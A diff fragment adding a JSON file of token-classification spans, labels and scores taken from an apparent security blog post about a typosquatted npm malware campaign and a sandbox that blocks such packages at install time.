+      "start": 3316,
+      "end": 3329
+    },
+    {
+      "entity": "our",
+      "type": "LABEL_1",
+      "score": 0.7065274715423584,
+      "start": 3330,
+      "end": 3333
+    },
+    {
+      "entity": "( also open sourced ) cli",
+      "type": "LABEL_0",
+      "score": 0.6924675107002258,
+      "start": 3334,
+      "end": 3357
+    },
+    {
+      "entity": "so that",
+      "type": "LABEL_1",
+      "score": 0.5709208250045776,
+      "start": 3359,
+      "end": 3366
+    },
+    {
+      "entity": "users can run things like :",
+      "type": "LABEL_0",
+      "score": 0.6240276098251343,
+      "start": 3367,
+      "end": 3393
+    },
+    {
+      "entity": "ph",
+      "type": "LABEL_1",
+      "score": 0.5170655250549316,
+      "start": 3394,
+      "end": 3396
+    },
+    {
+      "entity": "##ylum npm install",
+      "type": "LABEL_0",
+      "score": 0.7243730425834656,
+      "start": 3396,
+      "end": 3412
+    },
+    {
+      "entity": "<",
+      "type": "LABEL_1",
+      "score": 0.5075512528419495,
+      "start": 3413,
+      "end": 3414
+    },
+    {
+      "entity": "pkg",
+      "type": "LABEL_0",
+      "score": 0.5850532650947571,
+      "start": 3414,
+      "end": 3417
+    },
+    {
+      "entity": "##name",
+      "type": "LABEL_1",
+      "score": 0.5896450877189636,
+      "start": 3417,
+      "end": 3421
+    },
+    {
+      "entity": "> below is the actual",
+      "type": "LABEL_0",
+      "score": 0.6552544832229614,
+      "start": 3421,
+      "end": 3442
+    },
+    {
+      "entity": "behavior of",
+      "type": "LABEL_1",
+      "score": 0.6704516410827637,
+      "start": 3443,
+      "end": 3454
+    },
+    {
+      "entity": "the sandbox on one",
+      "type": "LABEL_0",
+      "score": 0.6688675880432129,
+      "start": 3455,
+      "end": 3473
+    },
+    {
+      "entity": "of",
+      "type": "LABEL_1",
+      "score": 0.5451302528381348,
+      "start": 3474,
+      "end": 3476
+    },
+    {
+      "entity": "the packages from the above campaign",
+      "type": "LABEL_0",
+      "score": 0.7172601222991943,
+      "start": 3477,
+      "end": 3513
+    },
+    {
+      "entity": ". when",
+      "type": "LABEL_1",
+      "score": 0.7613515257835388,
+      "start": 3513,
+      "end": 3519
+    },
+    {
+      "entity": "the package attempts to reach",
+      "type": "LABEL_0",
+      "score": 0.5957124829292297,
+      "start": 3520,
+      "end": 3549
+    },
+    {
+      "entity": "out to",
+      "type": "LABEL_1",
+      "score": 0.5876390337944031,
+      "start": 3550,
+      "end": 3556
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_0",
+      "score": 0.674529492855072,
+      "start": 3557,
+      "end": 3560
+    },
+    {
+      "entity": "discord",
+      "type": "LABEL_1",
+      "score": 0.5464264154434204,
+      "start": 3561,
+      "end": 3568
+    },
+    {
+      "entity": "webhook",
+      "type": "LABEL_0",
+      "score": 0.6779484748840332,
+      "start": 3569,
+      "end": 3576
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.7034768462181091,
+      "start": 3576,
+      "end": 3577
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_0",
+      "score": 0.7166023850440979,
+      "start": 3578,
+      "end": 3581
+    },
+    {
+      "entity": "installation",
+      "type": "LABEL_1",
+      "score": 0.6333157420158386,
+      "start": 3582,
+      "end": 3594
+    },
+    {
+      "entity": "process is aborted",
+      "type": "LABEL_0",
+      "score": 0.6486267447471619,
+      "start": 3595,
+      "end": 3613
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.7716274261474609,
+      "start": 3613,
+      "end": 3614
+    },
+    {
+      "entity": "please note that we",
+      "type": "LABEL_1",
+      "score": 0.6201774477958679,
+      "start": 3615,
+      "end": 3634
+    },
+    {
+      "entity": "had",
+      "type": "LABEL_0",
+      "score": 0.586219310760498,
+      "start": 3635,
+      "end": 3638
+    },
+    {
+      "entity": "to",
+      "type": "LABEL_1",
+      "score": 0.5689101219177246,
+      "start": 3639,
+      "end": 3641
+    },
+    {
+      "entity": "pull",
+      "type": "LABEL_0",
+      "score": 0.5686463117599487,
+      "start": 3642,
+      "end": 3646
+    },
+    {
+      "entity": "the tar.",
+      "type": "LABEL_1",
+      "score": 0.5934514403343201,
+      "start": 3647,
+      "end": 3655
+    },
+    {
+      "entity": "gz from",
+      "type": "LABEL_0",
+      "score": 0.615231990814209,
+      "start": 3655,
+      "end": 3662
+    },
+    {
+      "entity": "our file storage, as",
+      "type": "LABEL_1",
+      "score": 0.6228739619255066,
+      "start": 3663,
+      "end": 3683
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_0",
+      "score": 0.5366722941398621,
+      "start": 3684,
+      "end": 3687
+    },
+    {
+      "entity": "package in question had",
+      "type": "LABEL_1",
+      "score": 0.6305958032608032,
+      "start": 3688,
+      "end": 3711
+    },
+    {
+      "entity": "already",
+      "type": "LABEL_0",
+      "score": 0.5159241557121277,
+      "start": 3712,
+      "end": 3719
+    },
+    {
+      "entity": "been removed by npm. in",
+      "type": "LABEL_1",
+      "score": 0.6185266375541687,
+      "start": 3720,
+      "end": 3743
+    },
+    {
+      "entity": "a",
+      "type": "LABEL_0",
+      "score": 0.7477172613143921,
+      "start": 3744,
+      "end": 3745
+    },
+    {
+      "entity": "real scenario, this package would '",
+      "type": "LABEL_1",
+      "score": 0.6191533803939819,
+      "start": 3746,
+      "end": 3780
+    },
+    {
+      "entity": "ve been blocked by",
+      "type": "LABEL_0",
+      "score": 0.6513844728469849,
+      "start": 3780,
+      "end": 3798
+    },
+    {
+      "entity": "the ph",
+      "type": "LABEL_1",
+      "score": 0.557243287563324,
+      "start": 3799,
+      "end": 3805
+    },
+    {
+      "entity": "##yl",
+      "type": "LABEL_0",
+      "score": 0.7950010895729065,
+      "start": 3805,
+      "end": 3807
+    },
+    {
+      "entity": "##um package",
+      "type": "LABEL_1",
+      "score": 0.5889898538589478,
+      "start": 3807,
+      "end": 3817
+    },
+    {
+      "entity": "pre -",
+      "type": "LABEL_0",
+      "score": 0.6517125368118286,
+      "start": 3818,
+      "end": 3822
+    },
+    {
+      "entity": "check before it even",
+      "type": "LABEL_1",
+      "score": 0.6323741674423218,
+      "start": 3822,
+      "end": 3842
+    },
+    {
+      "entity": "had",
+      "type": "LABEL_0",
+      "score": 0.6789024472236633,
+      "start": 3843,
+      "end": 3846
+    },
+    {
+      "entity": "a chance to run",
+      "type": "LABEL_1",
+      "score": 0.6508457660675049,
+      "start": 3847,
+      "end": 3862
+    },
+    {
+      "entity": "in",
+      "type": "LABEL_0",
+      "score": 0.6170696020126343,
+      "start": 3863,
+      "end": 3865
+    },
+    {
+      "entity": "the sandbox",
+      "type": "LABEL_1",
+      "score": 0.5591961145401001,
+      "start": 3866,
+      "end": 3877
+    },
+    {
+      "entity": "!",
+      "type": "LABEL_0",
+      "score": 0.5127074122428894,
+      "start": 3877,
+      "end": 3878
+    },
+    {
+      "entity": "typosqu",
+      "type": "LABEL_1",
+      "score": 0.7156587243080139,
+      "start": 3879,
+      "end": 3886
+    },
+    {
+      "entity": "##ats",
+      "type": "LABEL_0",
+      "score": 0.6197418570518494,
+      "start": 3886,
+      "end": 3889
+    },
+    {
+      "entity": "remain",
+      "type": "LABEL_1",
+      "score": 0.5521470904350281,
+      "start": 3890,
+      "end": 3896
+    },
+    {
+      "entity": "a",
+      "type": "LABEL_0",
+      "score": 0.6031240820884705,
+      "start": 3897,
+      "end": 3898
+    },
+    {
+      "entity": "popular",
+      "type": "LABEL_1",
+      "score": 0.5067121982574463,
+      "start": 3899,
+      "end": 3906
+    },
+    {
+      "entity": "distribution technique",
+      "type": "LABEL_0",
+      "score": 0.650519847869873,
+      "start": 3907,
+      "end": 3929
+    },
+    {
+      "entity": "for",
+      "type": "LABEL_1",
+      "score": 0.6332396268844604,
+      "start": 3930,
+      "end": 3933
+    },
+    {
+      "entity": "malware",
+      "type": "LABEL_0",
+      "score": 0.6220319867134094,
+      "start": 3934,
+      "end": 3941
+    },
+    {
+      "entity": ". this",
+      "type": "LABEL_1",
+      "score": 0.7777070999145508,
+      "start": 3941,
+      "end": 3947
+    },
+    {
+      "entity": "is one",
+      "type": "LABEL_0",
+      "score": 0.5298709869384766,
+      "start": 3948,
+      "end": 3954
+    },
+    {
+      "entity": "of",
+      "type": "LABEL_1",
+      "score": 0.6334188580513,
+      "start": 3955,
+      "end": 3957
+    },
+    {
+      "entity": "the larger",
+      "type": "LABEL_0",
+      "score": 0.6081860661506653,
+      "start": 3958,
+      "end": 3968
+    },
+    {
+      "entity": "typosquat",
+      "type": "LABEL_1",
+      "score": 0.5788552761077881,
+      "start": 3969,
+      "end": 3978
+    },
+    {
+      "entity": "activities",
+      "type": "LABEL_0",
+      "score": 0.6316171884536743,
+      "start": 3979,
+      "end": 3989
+    },
+    {
+      "entity": "we",
+      "type": "LABEL_1",
+      "score": 0.5873247385025024,
+      "start": 3990,
+      "end": 3992
+    },
+    {
+      "entity": "' ve",
+      "type": "LABEL_0",
+      "score": 0.5397964715957642,
+      "start": 3992,
+      "end": 3995
+    },
+    {
+      "entity": "seen this",
+      "type": "LABEL_1",
+      "score": 0.6942452192306519,
+      "start": 3996,
+      "end": 4005
+    },
+    {
+      "entity": "year",
+      "type": "LABEL_0",
+      "score": 0.5847863554954529,
+      "start": 4006,
+      "end": 4010
+    },
+    {
+      "entity": "and",
+      "type": "LABEL_1",
+      "score": 0.7582926750183105,
+      "start": 4011,
+      "end": 4014
+    },
+    {
+      "entity": "should serve",
+      "type": "LABEL_0",
+      "score": 0.5295596122741699,
+      "start": 4015,
+      "end": 4027
+    },
+    {
+      "entity": "as",
+      "type": "LABEL_1",
+      "score": 0.5018588304519653,
+      "start": 4028,
+      "end": 4030
+    },
+    {
+      "entity": "a",
+      "type": "LABEL_0",
+      "score": 0.5049583315849304,
+      "start": 4031,
+      "end": 4032
+    },
+    {
+      "entity": "constant reminder that",
+      "type": "LABEL_1",
+      "score": 0.6098625659942627,
+      "start": 4033,
+      "end": 4055
+    },
+    {
+      "entity": "actors continue",
+      "type": "LABEL_0",
+      "score": 0.6591817736625671,
+      "start": 4056,
+      "end": 4071
+    },
+    {
+      "entity": "to publish",
+      "type": "LABEL_1",
+      "score": 0.5592749118804932,
+      "start": 4072,
+      "end": 4082
+    },
+    {
+      "entity": "malicious packages into",
+      "type": "LABEL_0",
+      "score": 0.6561789512634277,
+      "start": 4083,
+      "end": 4106
+    },
+    {
+      "entity": "our",
+      "type": "LABEL_1",
+      "score": 0.5409736037254333,
+      "start": 4107,
+      "end": 4110
+    },
+    {
+      "entity": "open - source",
+      "type": "LABEL_0",
+      "score": 0.6571634411811829,
+      "start": 4111,
+      "end": 4122
+    },
+    {
+      "entity": "package",
+      "type": "LABEL_1",
+      "score": 0.6280900239944458,
+      "start": 4123,
+      "end": 4130
+    },
+    {
+      "entity": "repositories",
+      "type": "LABEL_0",
+      "score": 0.5848209857940674,
+      "start": 4131,
+      "end": 4143
+    },
+    {
+      "entity": ". the",
+      "type": "LABEL_1",
+      "score": 0.6459717750549316,
+      "start": 4143,
+      "end": 4148
+    },
+    {
+      "entity": "packages given",
+      "type": "LABEL_0",
+      "score": 0.7492320537567139,
+      "start": 4149,
+      "end": 4163
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_1",
+      "score": 0.6798033118247986,
+      "start": 4164,
+      "end": 4167
+    },
+    {
+      "entity": "speed that",
+      "type": "LABEL_0",
+      "score": 0.5739994049072266,
+      "start": 4168,
+      "end": 4178
+    },
+    {
+      "entity": "these",
+      "type": "LABEL_1",
+      "score": 0.5048844218254089,
+      "start": 4179,
+      "end": 4184
+    },
+    {
+      "entity": "packages were published",
+      "type": "LABEL_0",
+      "score": 0.6651301383972168,
+      "start": 4185,
+      "end": 4208
+    },
+    {
+      "entity": ", it",
+      "type": "LABEL_1",
+      "score": 0.7064554691314697,
+      "start": 4208,
+      "end": 4212
+    },
+    {
+      "entity": "seems likely",
+      "type": "LABEL_0",
+      "score": 0.624358057975769,
+      "start": 4213,
+      "end": 4225
+    },
+    {
+      "entity": "that publications",
+      "type": "LABEL_1",
+      "score": 0.5874162912368774,
+      "start": 4226,
+      "end": 4243
+    },
+    {
+      "entity": "are automated",
+      "type": "LABEL_0",
+      "score": 0.6577430963516235,
+      "start": 4244,
+      "end": 4257
+    },
+    {
+      "entity": ". it",
+      "type": "LABEL_1",
+      "score": 0.6015654802322388,
+      "start": 4257,
+      "end": 4261
+    },
+    {
+      "entity": "is not entirely",
+      "type": "LABEL_0",
+      "score": 0.6944707036018372,
+      "start": 4262,
+      "end": 4277
+    },
+    {
+      "entity": "clear how",
+      "type": "LABEL_1",
+      "score": 0.6552417874336243,
+      "start": 4278,
+      "end": 4287
+    },
+    {
+      "entity": "some of",
+      "type": "LABEL_0",
+      "score": 0.5479527115821838,
+      "start": 4288,
+      "end": 4295
+    },
+    {
+      "entity": "these",
+      "type": "LABEL_1",
+      "score": 0.610569953918457,
+      "start": 4296,
+      "end": 4301
+    },
+    {
+      "entity": "packages names",
+      "type": "LABEL_0",
+      "score": 0.6462748050689697,
+      "start": 4302,
+      "end": 4316
+    },
+    {
+      "entity": "were generated, as",
+      "type": "LABEL_1",
+      "score": 0.6716382503509521,
+      "start": 4317,
+      "end": 4335
+    },
+    {
+      "entity": "many have",
+      "type": "LABEL_0",
+      "score": 0.6259806752204895,
+      "start": 4336,
+      "end": 4345
+    },
+    {
+      "entity": "edit distances",
+      "type": "LABEL_1",
+      "score": 0.6561846733093262,
+      "start": 4346,
+      "end": 4360
+    },
+    {
+      "entity": "far",
+      "type": "LABEL_0",
+      "score": 0.6843376755714417,
+      "start": 4361,
+      "end": 4364
+    },
+    {
+      "entity": "away",
+      "type": "LABEL_1",
+      "score": 0.6864812970161438,
+      "start": 4365,
+      "end": 4369
+    },
+    {
+      "entity": "from the actual angu",
+      "type": "LABEL_0",
+      "score": 0.6276923418045044,
+      "start": 4370,
+      "end": 4390
+    },
+    {
+      "entity": "##lar and",
+      "type": "LABEL_1",
+      "score": 0.5956633687019348,
+      "start": 4390,
+      "end": 4397
+    },
+    {
+      "entity": "react",
+      "type": "LABEL_0",
+      "score": 0.5486790537834167,
+      "start": 4398,
+      "end": 4403
+    },
+    {
+      "entity": "package",
+      "type": "LABEL_1",
+      "score": 0.5747556686401367,
+      "start": 4404,
+      "end": 4411
+    },
+    {
+      "entity": "names",
+      "type": "LABEL_0",
+      "score": 0.5967082381248474,
+      "start": 4412,
+      "end": 4417
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.8020387291908264,
+      "start": 4417,
+      "end": 4418
+    },
+    {
+      "entity": "it seems reasonable the",
+      "type": "LABEL_0",
+      "score": 0.5683152079582214,
+      "start": 4419,
+      "end": 4442
+    },
+    {
+      "entity": "edits",
+      "type": "LABEL_1",
+      "score": 0.5199586749076843,
+      "start": 4443,
+      "end": 4448
+    },
+    {
+      "entity": "are also",
+      "type": "LABEL_0",
+      "score": 0.5487931370735168,
+      "start": 4449,
+      "end": 4457
+    },
+    {
+      "entity": "automated,",
+      "type": "LABEL_1",
+      "score": 0.6310054063796997,
+      "start": 4458,
+      "end": 4468
+    },
+    {
+      "entity": "resulting",
+      "type": "LABEL_0",
+      "score": 0.5823642611503601,
+      "start": 4469,
+      "end": 4478
+    },
+    {
+      "entity": "in",
+      "type": "LABEL_1",
+      "score": 0.6096007227897644,
+      "start": 4479,
+      "end": 4481
+    },
+    {
+      "entity": "some non -",
+      "type": "LABEL_0",
+      "score": 0.6393463611602783,
+      "start": 4482,
+      "end": 4491
+    },
+    {
+      "entity": "human",
+      "type": "LABEL_1",
+      "score": 0.5169716477394104,
+      "start": 4491,
+      "end": 4496
+    },
+    {
+      "entity": "like",
+      "type": "LABEL_0",
+      "score": 0.5151209235191345,
+      "start": 4497,
+      "end": 4501
+    },
+    {
+      "entity": "\" typos \".",
+      "type": "LABEL_1",
+      "score": 0.6204788088798523,
+      "start": 4502,
+      "end": 4510
+    }
+  ]
+}
